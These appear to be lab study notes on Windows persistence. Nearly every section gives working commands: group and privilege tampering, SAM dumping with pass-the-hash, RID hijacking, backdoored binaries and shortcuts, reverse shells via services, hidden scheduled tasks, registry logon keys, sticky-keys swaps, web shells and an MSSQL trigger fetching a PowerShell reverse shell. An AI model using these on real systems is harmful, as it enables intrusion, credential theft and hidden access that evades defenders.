- Refers to creating alternate ways to regain access to a host after gaining administrative access without going through the exploitation phase all over again.
- Many reasons to quickly establish persistence
	- Re-exploitation isn't always possible due to unstable exploits.
	- Gaining foothold is hard to reproduce, like phishing campaigns.
	- Any vulnerabilities used to gain access might be patched if action is detected.
- ## *Tampering with Unprivileged Users*
	- Manipulate unprivileged users, which usually won't be monitored as much as administrators, and grant them administrator privileges somehow.
	- #### *Assign Group Memberships*
		- Assuming that the password hashes for unprivileged users were already dumped and successfully cracked any of them.
		- Using `net localgroup administrators thmuser0 /add` to add the user `thmuser0` to the administrators group.
		- If this looks too suspicious, use the group `Backup Operators`, users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL.
			- Allowing us to copy the content of the SAM and SYSTEM registry hives, which can be used to recover the password hashes for all users, enabling us to escalate to any administrative account easily.
			- Using `net localgroup "Backup Operators" thmuser1 /add` and since this unprivileged user can't RDP or WinRM back to the machine, add it to the `Remote Desktop Users` (RDP) or `Remote Management Users` (WinRM) groups `net localgroup "Remote Management Users" thmuser1 /add`.
			- Check for the group assigned using `whoami /groups` and make sure that the groups aren't disabled. This is due to the `User Account Control` which implements a feature called `LocalAccountTokenFilterPolicy` that strips any local account of its administrative privileges when logging in remotely.
			- Disable the `LocalAccountTokenFilterPolicy` by changing the the registry key to 1 `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1`.
			- After that, establish a WinRM connection using `evil-winrm -i <ip> -u <user> -p <password>`.
			- Check for the assigned groups using `whoami /groups`.
			- Backup the SAM and SYSTEM files using `reg save hklm\sam sam.bak` and `reg save hklm\system system.bak` then download them to the attacking machine using `download system.bak` and `download sam.bak`.
			- In case WinRM takes a lot of time to download the files, try other file transfer methods.
			- Dump the passwords using `python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL`.
			- After getting the hash, perform a Pass-the-Hash to connect to the victim `evil-winrm -i <ip> -u Administrator -H <hash>`.
	- #### *Special Privileges and Security Descriptors*
		- A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership.
		- Special groups are only special because the operation system assigns them specific privileges by default.
		- In the case of Backup Operators, they have `SeBackupPrivilege` and `SeRestorePrivilege` by default.
		- These privileges can be assigned to any user
			- First export the current configuration to a temp file `secedit /export /cfg config.inf`.
			- Open the file and add a user to the lines in the configuration regarding the `SeBackupPrivilege` and `SeRestorePrivilege`.
			- Convert the .inf file into a .sdb file which is used to load the configuration back into the system `secedit /import /cfg config.inf /db config.sdb` then `secedit /configure /db config.sdb /cfg config.inf`.
			- Now, we should have a user with equivalent privileges to any Backup Operator, but the user still cant login to the system using WinRM.
			- Instead of adding the user to the `Remote Management Users` group, change the security descriptor associated with the WinRM service to allow the user to connect.
			- Security Descriptors are like ACLs but applied to other system facilities.
			- Open the configuration window for WinRM's security descriptor using `Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI` in PowerShell, this will open a window where we can add a user and assign full privileges to connect to WinRM.
			- After that connect with WinRM and recover the password hashes from the SAM and SYSTEM and connect back with the Administrator user.
			- Use `evil-winrm -i <ip> -u Administrator -H <hash>` to connect with Administrator user.
			- For the user to work with the given privileges fully, change the `LocalAccountTokenFilterPolicy` registry key using  `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1`.
			- Check user's groups using `net user thmuser2`, since we didn't add the user to any group, nothing is suspicious.
			- Assuming that the credentials of the user are dumped, connect using WinRM.
	- #### *RID Hijacking* 
		- Changing some registry values to make the operating system think you are the Administrator.
		- When a user is created, an identifier called Relative ID (RID) is assigned to them. The RID is a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID.
		- If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.
		- By default, the Administrator account is assigned `RID 500`and a regular user is assigned `RID >= 1000`.
		- Find assigned RIDs using `wmic useraccount get name,sid`, the RID is the last bit of the SID.
		- Access the SAM using Regedit to assign the Administrator RID to an unprivileged user. The SAM is restricted to the SYSTEM account only, even the Administrator won't be able to edit it.
		- To run Regedit as SYSTEM, use psexec `Psexec64.exe -i -s regedit`.
		- Go to `HKLM\SAM\SAM\Domains\Account\Users\` where there will be a key for each user, using the found RID of the unprivileged user (converting it to hex), there will be a value called `F` which holds the user's RID at position `0x30`.
		- The RID is stored using little-endian notation, so its bytes appear reversed.
		- Replace those two bytes with the RID of Administrator in hex `500 = 0x01F4` switching the bytes around to `F401`.
		- The next time this user logs in, LSASS will associate it with the same RID as Administrator.
- ## *Backdooring Files*
	- Tampering with files that the user interacts with regularly to plant backdoors that will get executed whenever the user accesses them, and to keep a low profile and not alert the user, the file should keep working normally.
	- #### *Executable Files*
		- In case of an executable found laying around in the desktop, there is a high chance that the user use it frequently.
		- For example, found a shortcut to PuTTY lying around, if we check the properties, it usually points to `C:\Program Files\PuTTY\putty.exe`.
		- Download the executable from the target machine and modify it to  run any payload we want.
		- Using `msfvenom` to plant any payload into a .exe file, the binary will still work as usual but executes an additional payload silently by adding an extra thread in your binary `msfvenom -a x64 --platform windows -x putty.exe -k -p windows\x64\shell_reverse_tcp lhost=<attack-ip> lport=4444 -b "\x00" -f exe -o puttyX.exe`.
	- #### *Shortcut Files*
		- In case we don't want to alter an executable, we can alter the shortcut itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.
		- For example, altering the shortcut `calc`, right-click and select properties, look at the `Target` field pointing to the `calc.exe` file.
			- Before hijacking the target, create a simple PowerShell script in `C:\Windows\System32` or any other sneaky location.
			- The script will execute a reverse shell and run `calc.exe` from the original location on the shortcut's properties.
			- The script contains
				`Start-Process -NoNewWindow "C:\tools\nc64.exe" "-e cmd.exe <attack-ip> 4445`
				`C:\Windows\System32\calc.exe`
			- Then change the shortcut's target to point to the script created above.
			- Sometimes the shortcut's icon changes, point the icon back to the original executable.
			- The shortcut's target should contain `powershell.exe -WindowStyle hidden c:\Windows\System32\backdoor.ps1`.
			- Open a netcat listener to catch the reverse shell.
	- #### *Hijacking File Associations*
		- This forces the operating system to run a shell whenever the user opens a specific file type.
		- The default operating system file associations are kept inside the registry, where a key is stored for every file type under `HKLM\Software\Classes\`.
		- The Programmatic ID (ProgID) is an identifier to a program installed on the system that's in charge of handling the associated file which is at the (Default) row and Data column, in case of `.txt` files, its `txtfile`.
		- Searching for the subkey for the corresponding ProgID also under `HKLM\Software\Classes`, for this example, `HKLM\Software\Classes\txtfile\shell\open\command`.
		- Replace the command in Data column to with a script that executes a backdoor and then opens the file as usual.
		- Create the script and save it to `C:\Windows\backdoor2.ps1`, the script should contain
			`Start-Process -NoNewWindow "c:\tools\nc64.exe "-e cmd.exe <attacker-ip> 4448"`
			`C:\Windows\System32\NOTEPAD.EXE $args[0]`
		- Set the Data column should contain `powershell -windowstyle hidden C:\Windows\System32\backdoor2.ps1 %1`.
		- Create a listener to catch the reverse shell.
- ## *Abusing Services*
	- Windows services is a great way to establish persistence since they can run in the background whenever the victim machine is started.
	- When configuring a service, you define which executable will be used and select if the service will automatically run when the machine starts or should be manually started.
	- #### *Creating Backdoor Services*
		- Create and start a new service called `THMservice` using `sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto` and `sc.exe start THMservice`. **NOTE: The space after the equal sign**
		- This resets the administrator's password to `Passwd123`.
		- Another way is to create a reverse shell using `msfvenom` and associate it with the created service. Notice that service executables are unique, they implement certain protocol to be handled by the system.
		- Create an executable that is compatible with Windows services using the `exe-service` format, `msfvenom -p windows/x64/shell_reverse_tcp lhost=<attacker-ip> lport=4448 -f exe-service -o rev-svc.exe`.
		- Transfer the executable to the target system and point the service's `binPath` to it, `sc.exe create THMservice2 binPath= "C:\Windows\rev-svc.exe" start= auto` then `sc.exe start THMservice2`.
	- #### *Modifying Existing Services*
		- Since the blue team might monitor new service creation across the network, we might want to reuse an existing service instead of creating one to avoid detection. Usually, any disabled service is a good candidate.
		- List available services using `sc.exe query state=all`.
		- Find a stopped service and query its configuration using `sc.exe qc <service-name>`.
		- Three things to care about using a service
			- The executable `BINARY_PATH_NAME` which should point to our payload.
			- The service `START_TYPE` should be automatic so that it runs without interaction.
			- The `SERVICE_START_NAME` which is the account that the service runs with, should preferably be set to `LocalSystem`.
		- Create a reverse shell using `msfvenom -p windows\x64\shell_reverse_tcp lhost=<attacker-ip> lport=5558 -f exe-service -o rev-svc2.exe`.
		- Transfer the executable.
		- Reconfigure the service using `sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"`.
		- Query service's configuration again to check using `sc.exe qc THMservice3`.
		- Stop and start the service to catch the reverse shell.
- ## *Abusing Scheduled Tasks*
	- #### *Task Scheduler*
		- The most common way to schedule tasks is with this built-in scheduler. Allows for granular control, tasks that activate at specific time, repeat periodically or even triggered by an event.
		- Use `schtasks` to list the scheduled tasks.
		- Create a task that runs a reverse shell every minute, in a real scenario this shouldn't be done so often.
		- `schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64.exe -e cmd.exe <attacker-ip> 4449" /ru SYSTEM`.
		- This command creates a `THM-TaskBackdoor` task and executes `nc64` reverse shell back to  the attacker, the `/sc` and `/mo` specifies that the task runs every minute, and `/ru` option indicates that the task runs as SYSTEM.
		- Check the created task using `schtasks /query /tn thm-taskbackdoor`.
		- **Making the Task Invisible**
			- Deleting its Security Descriptor (SD) makes it invisible to any user in the system.
			- Security Descriptors are saved in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`.
			- Using `PsExec64.exe -s -i regedit` to open Regedit as SYSTEM, and delete the SD key of the task.
			- If we try to query the service again, it shouldn't be found.
- ## *Logon Triggered Persistence*
	- Some actions performed by a user might be bound to executing specific payloads for persistence. Windows present several ways to link payloads with particular interactions.
	- #### *Startup Folder*
		- Each user has a folder under `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` where you can put executables to be run whenever the user logs in.
		- If we want to force all users to run a payload when logging in, use the folder under `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`.
		- Generate a reverse shell with `msfvenom -p windows/x64/shell_reverse_tcp lhost=<attacker-ip> lport=4450 -f exe -o revshell1.exe`.
		- Transfer the payload to the target.
		- Store the payload in `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` folder.
		- Logout and then log back in to receive the shell.
	- #### *Run / RunOnce*
		- Force a user to execute a program on logon via the registry. Instead of delivering the payload into a specific directory, use the following registry entries to specify applications to run at logon
			- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
			- `HKCU\Software\Microsoft\Windwos\CurrentVersion\RunOnce`
			- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
			- `HKLM\Software\Microsoft\Windwos\CurrentVersion\RunOnce`
		- Registry entries under `HKCU` only apply to current user, and those under `HKLM` applies to everyone.
		- Create a reverse shell using `msfvenom -p windows/x64/shell_reverse_tcp lhost=<attacker-ip> lport=4451 -f exe -o revshell2.exe`.
		- Transfer the file to any location, like `C:\Windows\`.
		- Create a `REG_EXPAND_SZ` registry entry type under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`, with any name of our choosing and configure the Data to `C:\Windows\revshell2.exe`.
		- Sign out of the current session and log back in to trigger the shell.
	- #### *Winlogon*
		- Another alternative to automatically start programs on logon.
		- Winlogon is the component that loads the user profile right after authentication (among other things).
		- It uses some registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` that could be interesting to gain persistence
			- `UserInit` points to `userinit.exe` which is in charge of restoring the user profile preferences.
			- `shell` points to the system's shell, which is actually `explorer.exe`.
		- **If we would replace any of the executables with a reverse shell, we would break the logon sequence, which isn't desired**
		- Interestingly, you can append commands separated by commas, and Winlogon will process them all.
		- Create a shell using `msfvenom -p windows/x64/shell_reverse_tcp lhost=<attacker-ip> lport=4452 -f exe -o revshell3.exe`.
		- Transfer the file to any location, like `C:\Windows\`.
		- We then alter either `shell` or `Userinit` in `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`.
		- Sign out and log back in to trigger the shell.
	- #### *Logon Scripts*
		- One of the things that `Userinit.exe` does while loading the user profile is to check for an environment variable called `UserInitMprLogonScript`.
		- We can use this environment variable to assign a logon script to a user that will get run when logging in. The variable isn't set by default, so create it and assign any script to it.
		- Every user has his own environment variable, so assign one for each if needed.
		- Create a reverse shell using `msfvenom -p windows/x64/shell_reverse_tcp lhost=<attacker-ip> lport=4453 -f exe -o revshell4.exe`.
		- Transfer the file to any location, like `C:\Windows\`.
		- Create an environment variable from `HKCU\Environment` in the registry, use the `UserInitMprLogonScript` entry to point to our payload.
		- Entry type `REG_EXPAND_SZ` and Data `C:\Windows\revshell4.exe`.
		- Sign out and log back in to trigger the shell.
- ## *Backdooring the Login Screen / RDP*
	- If we have physical access or RDP to the machine, we can backdoor the login screen to access a terminal without having valid credentials.
	- #### *Sticky Keys*
		- Allows you to press the buttons of a combination sequentially instead of at the same time, `CTRL` then `ALT` then `Delete` instead of `CTRL+ALT+Delete` at the same time.
		- To establish persistence using Sticky Keys, abuse a shortcut enabled by default in any Windows system that allows us to activate Sticky Keys by pressing `SHIFT` 5 times.
		- After pressing `SHIFT` 5 times, Windows will execute the binary in `C:\Windows\System32\sethc.exe`, by replacing this binary to a payload of ours, we can then trigger it with the shortcut, we can even do this from the login screen before inputting credentials.
		- We first need to take ownership of the `sethc.exe` file so we could replace it with a copy of `cmd.exe`.
		- `takeown /f C:\Windows\System32\sethc.exe` then `icacls C:\Windows\System32\sethc.exe /grant Administrator:F`.
		- `copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe`.
		- Lock the session and press `SHIFT` 5 times to trigger the CLI.
	- #### *Utilman*
		- Built-in Windows application used to provide Ease of Access options during lock screen.
		- When the Ease of Access button is pressed on the lock screen, it executes `C:\Windows\System32\utilman.exe` with SYSTEM privileges.
		- If we replace it with a copy of `cmd.exe`, we can bypass the login screen.
		- Do the same thing as with Sticky Keys, take ownership of the file using `takeown /f C:\Windows\System32\utilman.exe`.
		- Use `icacls C:\Windows\System32\utilman.exe /grant Administrator:F` to give full control to Administrator account, then replace it with `cmd.exe` using `copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe`.
		- Trigger the terminal by locking the screen and clicking on the Easy of Access button.
- ## *Persisting Through Existing Services*
	- Plant backdoors in services like typical web server setup.
	- #### *Using Web Shells*
		- The usual way to achieve persistence in a web server is by uploading a web shell to the web directory, this would grant us privileges of the configured user in IIS which is by default `iis apppool\defaultapppool`.
		- Although this is an unprivileged user, it has the `SeImpersonatePrivilege` special privilege which provides an easy way to escalate to the Administrator user.
		- Download a web shell, for example from [here](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx), this is an ASP.NET web shell, move it into the webroot, which is by default is located `C:\inetpub\wwwroot`.
		- Depending on the transfer method, the file might not allow the web server to access it, grant everyone access with `icacls shell.aspx /grant Everyone:F`.
		- We could then run commands from the web server by going to `http://<ip>/shell.aspx`.
	- #### *Using MSSQL as a Backdoor*
		- A lot of ways to plant backdoors in MSSQL Server, one of them is abusing triggers. Triggers in MSSQL allow you to bind actions to be performed when specific events occur in the database.
		- Before creating the trigger, we must reconfigure a few things in the database.
			- Enable the `xp_cmdshell` stored procedure, this allows you to run commands directly in the system's console but comes disabled by default.
			- To enable it, open `Microsoft SQL Server Management Studio 18`, when asked to authenticate, use Windows Authentication, by default the local Administrator account will have access to all DBs.
			- Click `New Query` button.
			- Run the below commands to enable the Advanced Options
				`sp_configure 'Show Advanced Options', 1;`
				`RECONFIGURE;`
				`GO`
			- Run the below commands to enable the `xp_cmdshell`
				`sp_configure 'xp_cmdshell', 1;`
				`RECONFIGURE;`
				`GO`
			- Ensure that any website accessing the database can run `xp_cmdshell`, by default, only database users with the `sysadmin` role will be able to do so.
			- Grant privileges to all users to impersonate the `sa` user, which is the default database administrator
				`USE master`
				`GRANT IMPERSONATE ON LOGIN::sa to [Public];`
			- Configure a trigger
				- First change to the database required using `USE <DB-NAME>`.
				- The trigger will use `xp_cmdshell` to execute PowerShell to download and run a `.ps1` file from attacker's web server. The trigger will be configured to execute whenever an `INSERT` is made into the `Employees` table of the `HRDB` database.
					`CREATE TRIGGER [sql_backdoor]`
					`ON HRDB.dbo.Employees`
					`FOR INSERT AS`
					`EXECUTE AS LOGIN = 'sa'`
					`EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object Net.WebClient).downloadstring(''http://<attacker-ip>:8000/evilscript.ps1'')"';`
				- Now create the `evilscript.ps1` which will contain a PowerShell reverse shell
					`$client = New-Object System.Net.Sockets.TCPClient("<attacker-ip>",4454);`
					`$stream = $client.GetStream();`
					`[byte[]]$bytes = 0..65535|%{0};`
					`while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){`
						`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);`
						`$sendback = (iex $data 2>&1 | Out-String );`
						`$sendback2 = $sendback + "PS " + (pwd).Path + "> ";`
						`$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);`
						`$stream.Write($sendbyte,0,$sendbyte.Length);`
						`$stream.Flush()`
					`};`
					`$client.Close()`
				- We will need to open 2 terminals to handle the connections involved in the exploit
					- The trigger will perform the first connection to download and execute `evilscript.ps1`. Our trigger is using port 8000 for that `python3 -m http.server`.
					- The second connection will be a reverse shell on port 4454 back to our attacking machine `nc -lvnp 4454`.
				- Visit the website and insert a new entry to trigger the shell.
- ## *More Resources* 
	-  [Hexacorn - Windows Persistence](https://www.hexacorn.com/blog/category/autostart-persistence/)
    - [PayloadsAllTheThings - Windows Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md)
    - [Oddvar Moe - Windows Persistence Through RunOnceEx](https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/)
    - [PowerUpSQL](https://www.netspi.com/blog/technical/network-penetration-testing/establishing-registry-persistence-via-sql-server-powerupsql/)
